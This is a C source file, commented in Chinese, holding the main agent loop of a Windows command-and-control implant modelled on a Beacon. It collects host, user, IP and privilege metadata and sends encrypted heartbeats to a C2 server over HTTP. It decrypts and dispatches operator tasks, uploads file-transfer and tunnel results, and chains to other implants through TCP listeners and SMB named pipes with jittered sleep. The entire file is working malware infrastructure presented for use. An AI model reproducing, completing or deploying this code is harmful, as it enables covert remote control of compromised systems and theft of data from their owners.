#include "beacon_agent.h"

#include "beacon_commands.h"
#include "beacon_context.h"
#include "beacon_cascade.h"
#include "beacon_crypto.h"
#include "beacon_packet.h"
#include "beacon_sleep.h"
#include "beacon_transport.h"

#pragma comment(lib, "ws2_32.lib")

/*
 * Agent 层是 Beacon 的主循环：
 * 构建元数据心跳、拉取任务、调用 dispatcher、轮询异步子系统并上传结果。
 */

/* 构建元数据载荷 */
static ByteBuf BuildMetadataPayload(const BeaconContext* ctx)
{
    ByteBuf p;

    BbInit(&p);
    BbString(&p, ctx->meta.os);
    BbString(&p, ctx->meta.arch);
    BbString(&p, ctx->meta.hostname);
    BbString(&p, ctx->meta.username);
    BbString(&p, ctx->meta.internal_ip);
    BbString(&p, ctx->meta.process_name);
    BbU32(&p, ctx->meta.pid);
    BbU8(&p, (UINT8)(ctx->meta.is_admin ? 1 : 0));
    BbU32(&p, ctx->meta.acp);
    BbU32(&p, (UINT32)(ctx->profile.sleep_ms / 1000));
    BbU32(&p, (UINT32)ctx->profile.jitter);

    return p;
}

/* 构建明文心跳 */
static ByteBuf BuildHeartbeatPlain(const BeaconContext* ctx)
{
    ByteBuf meta = BuildMetadataPayload(ctx);
    ByteBuf p = PacketPackHeartbeat(ctx->beacon_id, ctx->session_key, sizeof(ctx->session_key), &meta);

    BbFree(&meta);
    return p;
}

/* 检查响应体是否为默认的 404 内容 */
static INT IsNotFoundBody(const ByteBuf* b)
{
    static const CHAR text[] = "404 page not found";
    return b->len == sizeof(text) - 1 && memcmp(b->data, text, b->len) == 0;
}

/* 解密并分发任务 */
static VOID DispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks)
{
    ByteBuf plain;
    Parser outer;

    /* 跳过空响应和 404 响应 */
    if (!encrypted_tasks->len || IsNotFoundBody(encrypted_tasks)) {
        return;
    }

    /* 解密任务数据 */
    if (!CryptoDecryptTask(ctx->session_key, sizeof(ctx->session_key), encrypted_tasks, &plain)) {
        return;
    }

    ParserInit(&outer, plain.data, plain.len);

    /* 逐个解析任务块 */
    while (ParserLeft(&outer) > 0 && !outer.error[0]) {
        ByteBuf task_block = ParserBytes(&outer);
        Parser task;
        UINT32 task_id;
        UINT32 command_id;
        ByteBuf payload;
        PacketList results;
        SIZE_T i;

        if (outer.error[0]) {
            BbFree(&task_block);
            break;
        }

        /* 解析任务头：task_id + command_id + payload */
        ParserInit(&task, task_block.data, task_block.len);
        task_id = ParserU32(&task);
        command_id = ParserU32(&task);
        payload = ParserBytes(&task);

        /* 将解析器错误作为状态数据包返回 */
        if (task.error[0]) {
            ByteBuf e = BbFromText(task.error);
            ByteBuf f = PacketMakeFinal(task_id, command_id, &e);
            OutboxEnqueue(&ctx->outbox, f);
            BbFree(&e);
            BbFree(&task_block);
            BbFree(&payload);
            continue;
        }

        /* 分发命令并收集结果 */
        results = CommandDispatch(ctx, task_id, command_id, &payload);

        /* 将结果数据包入队到发件箱 */
        for (i = 0; i < results.count; ++i) {
            if (results.items_are_final) {
                ByteBuf moved = results.items[i];
                BbInit(&results.items[i]);
                OutboxEnqueue(&ctx->outbox, moved);
            } else {
                ByteBuf f = PacketMakeFinal(task_id, command_id, &results.items[i]);
                OutboxEnqueue(&ctx->outbox, f);
            }
        }

        /* 检查命令是否请求退出 */
        if (results.should_exit) {
            ctx->active = 0;
        }

        PlistFree(&results);
        BbFree(&task_block);
        BbFree(&payload);
    }

    BbFree(&plain);
}

/* 轮询文件传输结果 */
static VOID FlushTransfers(BeaconContext* ctx)
{
    PacketList out = TransferPoll(ctx);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 轮询隧道数据 */
static VOID FlushTunnels(BeaconContext* ctx)
{
    PacketList out = TunnelPoll(&ctx->tunnels);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 加密并发送所有出站数据包 */
/* 轮询级联子链路数据 */
static VOID FlushCascade(BeaconContext* ctx)
{
    PacketList out = CascadePoll(&ctx->cascade);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 加密并通过 HTTP 发送所有出站数据包 */
static VOID FlushOutboxHttp(BeaconContext* ctx, const ByteBuf* heartbeat)
{
    OutboxNode* list = OutboxDrain(&ctx->outbox);
    OutboxNode* cur = list;

    while (cur) {
        ByteBuf encrypted;
        ByteBuf response;

        /* 加密当前数据包 */
        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted)) {
            OutboxPushFrontList(&ctx->outbox, cur);
            return;
        }

        /* 将数据包发送到 C2 服务器 */
        if (!TransportHttpExchange(&ctx->profile, heartbeat, &encrypted, &response)) {
            BbFree(&encrypted);
            OutboxPushFrontList(&ctx->outbox, cur);
            return;
        }

        BbFree(&encrypted);
        BbFree(&response);

        /* 释放已发送的节点并继续 */
        {
            OutboxNode* done = cur;
            cur = cur->next;
            OutboxFreeNode(done);
        }
    }
}

/* 加密并通过父级 TCP/SMB channel 发送所有出站数据包 */
static INT FlushOutboxInternal(BeaconContext* ctx, CascadeIo* upstream)
{
    OutboxNode* list = OutboxDrain(&ctx->outbox);
    OutboxNode* cur = list;

    while (cur) {
        ByteBuf encrypted;

        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted)) {
            OutboxPushFrontList(&ctx->outbox, cur);
            return 0;
        }

        if (!CascadeIoWriteFrame(upstream, CASCADE_FRAME_RESULT, &encrypted)) {
            BbFree(&encrypted);
            OutboxPushFrontList(&ctx->outbox, cur);
            return 0;
        }

        BbFree(&encrypted);

        {
            OutboxNode* done = cur;
            cur = cur->next;
            OutboxFreeNode(done);
        }
    }

    return 1;
}

typedef struct InternalInbound {
    ByteBuf packet;
    struct InternalInbound* next;
} InternalInbound;

typedef struct InternalRunState {
    BeaconContext* ctx;
    CascadeIo* upstream;
    CRITICAL_SECTION lock;
    HANDLE event;
    InternalInbound* head;
    InternalInbound* tail;
    LONG active;
    CascadeFrameReader frame_reader;
} InternalRunState;

static VOID InternalQueueTask(InternalRunState* state, ByteBuf* packet)
{
    InternalInbound* item;

    item = (InternalInbound*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*item));
    if (!item) {
        BbFree(packet);
        return;
    }

    item->packet = *packet;
    BbInit(packet);

    EnterCriticalSection(&state->lock);
    if (state->tail) {
        state->tail->next = item;
    } else {
        state->head = item;
    }
    state->tail = item;
    LeaveCriticalSection(&state->lock);

    SetEvent(state->event);
}

static InternalInbound* InternalDrainTasks(InternalRunState* state)
{
    InternalInbound* list;

    EnterCriticalSection(&state->lock);
    list = state->head;
    state->head = NULL;
    state->tail = NULL;
    LeaveCriticalSection(&state->lock);

    return list;
}

static INT InternalFeedFrameData(InternalRunState* state, const BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        UINT16 cmd = 0;
        ByteBuf body;
        INT consumed;

        BbInit(&body);
        consumed = CascadeFrameReaderFeed(&state->frame_reader, data + off, len - off, &cmd, &body);
        if (consumed < 0) return -1;
        if (consumed == 0) break;
        off += (SIZE_T)consumed;
        if (cmd == 0) continue;

        if (cmd == CASCADE_FRAME_TASK) {
            InternalQueueTask(state, &body);
        } else if (cmd == CASCADE_FRAME_PING) {
            CascadeIoWriteFrame(state->upstream, CASCADE_FRAME_PING, &body);
            BbFree(&body);
        } else if (cmd == CASCADE_FRAME_CLOSE) {
            BbFree(&body);
            return -1;
        } else {
            BbFree(&body);
        }
    }
    return 0;
}

static INT InternalPumpTcp(InternalRunState* state)
{
    BYTE8 buf[8192];
    INT n;

    for (;;) {
        n = recv(state->upstream->sock, (CHAR*)buf, sizeof(buf), 0);
        if (n > 0) {
            if (InternalFeedFrameData(state, buf, (SIZE_T)n) < 0) return -1;
        } else if (n == 0) {
            return -1;
        } else {
            if (WSAGetLastError() == WSAEWOULDBLOCK) return 0;
            return -1;
        }
    }
}

static INT InternalPumpPipe(InternalRunState* state)
{
    CascadeIo* io = state->upstream;
    DWORD read_bytes;

    if (io->read_pending) {
        if (!GetOverlappedResult(io->pipe, &io->read_olap, &read_bytes, FALSE)) return -1;
        io->read_pending = FALSE;
        if (read_bytes == 0) return -1;
        if (InternalFeedFrameData(state, io->read_buf, read_bytes) < 0) return -1;
        if (read_bytes < sizeof(io->read_buf)) return 0;
    }

    for (;;) {
        ResetEvent(io->read_event);
        ZeroMemory(&io->read_olap, sizeof(io->read_olap));
        io->read_olap.hEvent = io->read_event;
        if (!ReadFile(io->pipe, io->read_buf, sizeof(io->read_buf), &read_bytes, &io->read_olap)) {
            if (GetLastError() == ERROR_IO_PENDING) {
                io->read_pending = TRUE;
                return 0;
            }
            return -1;
        }
        if (read_bytes == 0) return -1;
        if (InternalFeedFrameData(state, io->read_buf, read_bytes) < 0) return -1;
        if (read_bytes < sizeof(io->read_buf)) return 0;
    }
}

static INT SendInternalHello(BeaconContext* ctx, CascadeIo* upstream)
{
    ByteBuf plain;
    ByteBuf heartbeat;
    ByteBuf body;
    ByteBuf packed_heartbeat;
    CHAR id[16];
    INT ok;

    plain = BuildHeartbeatPlain(ctx);
    ok = CryptoEncryptHeartbeat(ctx->profile.http.encrypt_key, &plain, &heartbeat);
    BbFree(&plain);
    if (!ok) {
        return 0;
    }

    BbInit(&body);
    snprintf(id, sizeof(id), "%08lx", (ULONG)ctx->beacon_id);
    PacketArrayString(&body, id);
    packed_heartbeat = PacketPackBytes(&heartbeat);
    PacketArrayBytes(&body, packed_heartbeat.data, packed_heartbeat.len);
    BbFree(&packed_heartbeat);

    ok = CascadeIoWriteFrame(upstream, CASCADE_FRAME_HELLO, &body);
    BbFree(&body);
    BbFree(&heartbeat);
    return ok;
}

static INT AgentRunInternal(Agent* agent, CascadeIo* upstream)
{
    BeaconContext* ctx = &agent->ctx;
    InternalRunState state;
    BOOL is_tcp;

    is_tcp = upstream->kind == CASCADE_IO_TCP;
    if (is_tcp) {
        if (!CascadeIoEnableTcpReadEvent(upstream)) {
            CascadeIoClose(upstream);
            return -1;
        }
    } else {
        if (!CascadeIoEnablePipeReadEvent(upstream)) {
            CascadeIoClose(upstream);
            return -1;
        }
    }

    if (!SendInternalHello(ctx, upstream)) {
        CascadeIoClose(upstream);
        return -1;
    }

    ZeroMemory(&state, sizeof(state));
    state.ctx = ctx;
    state.upstream = upstream;
    state.active = 1;
    state.event = CreateEventW(NULL, FALSE, FALSE, NULL);
    InitializeCriticalSection(&state.lock);
    CascadeFrameReaderInit(&state.frame_reader);

    if (!is_tcp) {
        if (InternalPumpPipe(&state) < 0) {
            CascadeIoClose(upstream);
            CascadeFrameReaderFree(&state.frame_reader);
            DeleteCriticalSection(&state.lock);
            CloseHandle(state.event);
            return -1;
        }
    }

    while (ctx->active &&
           InterlockedCompareExchange(&agent->stop, 0, 0) == 0 &&
           InterlockedCompareExchange(&state.active, 1, 1)) {
        HANDLE handles[2];
        DWORD count = 0;
        DWORD wait_ms = SleepCalculateWithJitter(&ctx->profile);
        DWORD wait_result;
        InternalInbound* list;

        handles[count++] = CascadeIoEvent(upstream);
        if (ctx->runtime.wake_event) {
            handles[count++] = ctx->runtime.wake_event;
        }
        if (wait_ms == 0) wait_ms = 1000;
        wait_result = BeaconWait(ctx, handles, count, wait_ms);
        if (wait_result == WAIT_OBJECT_0) {
            if (is_tcp) {
                LONG events = 0;

                if (!CascadeIoConsumeTcpEvent(upstream, &events)) break;
                if ((events & FD_READ) && InternalPumpTcp(&state) < 0) break;
                if (events & FD_CLOSE) break;
                if (!CascadeIoRearmTcpReadEvent(upstream)) break;
            } else {
                if (InternalPumpPipe(&state) < 0) break;
            }
        } else if (wait_result == WAIT_FAILED) {
            break;
        }

        list = InternalDrainTasks(&state);
        while (list) {
            InternalInbound* next = list->next;
            DispatchTasks(ctx, &list->packet);
            BbFree(&list->packet);
            HeapFree(GetProcessHeap(), 0, list);
            list = next;
        }

        FlushTransfers(ctx);
        FlushTunnels(ctx);
        FlushCascade(ctx);
        if (!FlushOutboxInternal(ctx, upstream)) break;
    }

    InterlockedExchange(&state.active, 0);
    CascadeIoClose(upstream);
    SetEvent(state.event);

    {
        InternalInbound* list = InternalDrainTasks(&state);
        while (list) {
            InternalInbound* next = list->next;
            BbFree(&list->packet);
            HeapFree(GetProcessHeap(), 0, list);
            list = next;
        }
    }

    CascadeFrameReaderFree(&state.frame_reader);
    DeleteCriticalSection(&state.lock);
    CloseHandle(state.event);
    return 0;
}

static INT AgentShouldRunInternal(Agent* agent)
{
    return agent &&
           agent->ctx.active &&
           InterlockedCompareExchange(&agent->stop, 0, 0) == 0;
}

static VOID AgentInternalReconnectDelay(Agent* agent)
{
    HANDLE wake_event;

    if (!AgentShouldRunInternal(agent)) return;

    wake_event = agent->ctx.runtime.wake_event;
    if (wake_event) {
        WaitForSingleObject(wake_event, 1000);
    } else {
        Sleep(1000);
    }
}

static INT AgentRunInternalTcp(Agent* agent)
{
    INT result = 0;

    while (AgentShouldRunInternal(agent)) {
        CascadeTcpListener listener;
        CascadeIo upstream;
        HANDLE handles[2];
        DWORD count;
        DWORD wait_ms;
        DWORD wait_result;
        BOOL accepted = FALSE;

        DebugPrintf("[*] Internal TCP listening on %s:%d\n",
                    agent->ctx.profile.tcp_internal.bind_host,
                    agent->ctx.profile.tcp_internal.bind_port);

        CascadeTcpListenerInit(&listener);
        if (!CascadeTcpListen(agent->ctx.profile.tcp_internal.bind_host,
                              agent->ctx.profile.tcp_internal.bind_port,
                              &listener)) {
            result = -1;
            break;
        }

        while (AgentShouldRunInternal(agent)) {
            count = 0;
            handles[count++] = CascadeTcpListenerEvent(&listener);
            if (agent->ctx.runtime.wake_event) {
                handles[count++] = agent->ctx.runtime.wake_event;
            }

            wait_ms = SleepCalculateWithJitter(&agent->ctx.profile);
            if (wait_ms == 0) wait_ms = 1000;
            wait_result = BeaconWait(&agent->ctx, handles, count, wait_ms);
            if (wait_result == WAIT_OBJECT_0) {
                accepted = CascadeTcpAcceptReady(&listener, &upstream);
                if (accepted) break;
            } else if (wait_result == WAIT_FAILED) {
                result = -1;
                break;
            }
        }

        CascadeTcpListenerClose(&listener);
        if (!accepted) break;

        AgentRunInternal(agent, &upstream);
        AgentInternalReconnectDelay(agent);
    }

    return result;
}

static INT AgentRunInternalSmb(Agent* agent)
{
    INT result = 0;

    while (AgentShouldRunInternal(agent)) {
        CascadePipeListener listener;
        CascadeIo upstream;
        HANDLE handles[2];
        DWORD count;
        DWORD wait_ms;
        DWORD wait_result;
        BOOL accepted = FALSE;

        DebugPrintf("[*] Internal SMB listening on %s\n",
                    agent->ctx.profile.smb_internal.pipe_name);

        CascadePipeListenerInit(&listener);
        if (!CascadePipeListen(agent->ctx.profile.smb_internal.pipe_name, &listener)) {
            result = -1;
            break;
        }

        while (AgentShouldRunInternal(agent)) {
            count = 0;
            handles[count++] = CascadePipeListenerEvent(&listener);
            if (agent->ctx.runtime.wake_event) {
                handles[count++] = agent->ctx.runtime.wake_event;
            }

            DebugPrintf("[*] SMB inner loop: count=%lu handle[0]=%p\n",
                        (unsigned long)count, handles[0]);

            wait_ms = SleepCalculateWithJitter(&agent->ctx.profile);
            if (wait_ms == 0) wait_ms = 1000;
            DebugPrintf("[*] SMB waiting %lu ms...\n", (unsigned long)wait_ms);
            wait_result = BeaconWait(&agent->ctx, handles, count, wait_ms);
            DebugPrintf("[*] SMB wait result: %lu (FAIL=%lu)\n",
                        (unsigned long)wait_result, (unsigned long)WAIT_FAILED);
            if (wait_result == WAIT_OBJECT_0) {
                accepted = CascadePipeAcceptReady(&listener, &upstream);
                DebugPrintf("[*] SMB accepted=%d\n", accepted);
                if (accepted) break;
            } else if (wait_result == WAIT_FAILED) {
                DebugPrintf("[!] SMB WAIT_FAILED, GetLastError=%lu\n",
                            (unsigned long)GetLastError());
                result = -1;
                break;
            }
        }

        CascadePipeListenerClose(&listener);
        if (!accepted) break;

        AgentRunInternal(agent, &upstream);
        AgentInternalReconnectDelay(agent);
    }

    return result;
}

/* 初始化 Agent 结构体、Win32 API 解析及 Winsock */
INT AgentInit(Agent* agent)
{
    if (!agent) {
        return 0;
    }

    SecureZeroMemory(agent, sizeof(*agent));

    ContextInit(&agent->ctx);

    /* ContextInit 会清零 BeaconContext，API 解析必须在它之后执行。 */
    if (!Win32ApiInit(&agent->ctx.api)) {
        ContextFree(&agent->ctx);
        return 0;
    }

    if (WSAStartup(MAKEWORD(2, 2), &agent->wsa) != 0) {
        ContextFree(&agent->ctx);
        return 0;
    }
    agent->wsa_started = 1;

    agent->initialized = 1;
    agent->stop = 0;
    return 1;
}

/* 释放 Agent 资源并清理 Winsock */
VOID AgentFree(Agent* agent)
{
    if (!agent) {
        return;
    }

    if (agent->initialized) {
        ContextFree(&agent->ctx);
        agent->initialized = 0;
    }

    if (agent->wsa_started) {
        WSACleanup();
        agent->wsa_started = 0;
    }
}

/* 信标主循环：心跳、任务分发、结果上传 */
INT AgentRun(Agent* agent)
{
    BeaconContext* ctx;

    if (!agent || !agent->initialized) {
        return -1;
    }

    ctx = &agent->ctx;

    DebugPrintf("[*] Beacon modular C starting...\n");
    DebugPrintf("[*] Metadata: OS=%s Arch=%s User=%s IP=%s\n",
                ctx->meta.os, ctx->meta.arch, ctx->meta.username, ctx->meta.internal_ip);
    DebugPrintf("[*] BeaconID: %lu\n", (unsigned long)ctx->beacon_id);

    if (_stricmp(ctx->profile.listener_type, "internal") == 0 &&
        _stricmp(ctx->profile.protocol, "tcp") == 0) {
        return AgentRunInternalTcp(agent);
    }

    if (_stricmp(ctx->profile.listener_type, "internal") == 0 &&
        _stricmp(ctx->profile.protocol, "smb") == 0) {
        return AgentRunInternalSmb(agent);
    }

    /* 主循环：心跳、接收任务、处理、上传结果 */
    while (ctx->active && InterlockedCompareExchange(&agent->stop, 0, 0) == 0) {
        ByteBuf plain;
        ByteBuf heartbeat;
        ByteBuf response;

        BeaconSleep(ctx);

        /* 构建并加密心跳 */
        plain = BuildHeartbeatPlain(ctx);
        if (!CryptoEncryptHeartbeat(ctx->profile.http.encrypt_key, &plain, &heartbeat)) {
            BbFree(&plain);
            continue;
        }
        BbFree(&plain);

        /* 与 C2 服务器交换数据 */
        if (TransportHttpExchange(&ctx->profile, &heartbeat, NULL, &response)) {
            DispatchTasks(ctx, &response);
            FlushTransfers(ctx);
            FlushTunnels(ctx);
            FlushCascade(ctx);
            FlushOutboxHttp(ctx, &heartbeat);
            BbFree(&response);
        }

        BbFree(&heartbeat);
    }

    return 0;
}

/* 请求 Agent 停止 */
VOID AgentStop(Agent* agent)
{
    if (agent) {
        InterlockedExchange(&agent->stop, 1);
    }
}
